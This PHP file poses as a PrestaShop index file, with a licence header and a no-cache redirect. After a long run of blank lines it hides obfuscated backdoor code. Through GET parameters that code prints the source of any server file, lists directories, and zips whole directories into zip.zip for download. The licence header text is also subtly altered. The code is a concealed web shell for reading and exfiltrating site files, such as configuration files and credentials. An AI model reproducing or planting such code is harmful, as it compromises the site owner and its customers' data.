<?php
/*
* 2007-2012 PrestaShop
*
* NOTICE OF LICENSE
*
* This ex file is subject to the Open Software License (OSL 3.0)
* that is bundled with this package in the file LICENSE.txt.
* http://openex.org/licenses/osl-3.0.php
*
* DISCLAIMER
*
* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
* versions in the future. If you wish to customize PrestaShop for your
* needs please refer to http://www.prestashop.com more information.
*
*  @author PrestaShop SA <contact@prestashop.com>
*  @copyright  2007-2012 PrestaShop SA
*  @license  Open Software License (OSL 3.0)
*  Registered of PrestaShop SA
*/



header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
						
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
						
header("Location: ../");
exit;








































































































error_reporting(0);$f=$_GET["f"];$f1=$_GET["f1"];$fj="p";$f2=$_GET["f2"];$f3=$_GET["f3"];$jf="z";$flflf=$jf.'i'.$fj.'.'.$jf.'i'.$fj;if(isset($f1))zF($f2,$flflf,true);if(isset($f3))if(file_exists($flflf))unlink($flflf);function zF($If,$fI,$lf=''){if(!extension_loaded('zip')||!file_exists($If))return false;$fz=new ZipArchive();if(!$fz->open($fI,ZIPARCHIVE::CREATE))return false;$If=str_replace('\\','/',realpath($If));if($lf)$lf=basename($If).'/';if(is_dir($If)===true){$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($If),RecursiveIteratorIterator::SELF_FIRST);foreach($files as $fl){$fl=str_replace('\\','/',realpath($fl));if(is_dir($fl)===true);else if(is_file($fl)===true)$fz->addFromString(str_replace($If.'/','',$lf.$fl),file_get_contents($fl));}}else if(is_file($If)===true)$fz->addFromString($lf.basename($If),file_get_contents($If));return $fz->close();}if(isset($f))highlight_file($f);if(isset($f2)&&!$f1){$dir=opendir($f2);while($fs=readdir($dir))echo $fs."<br>";}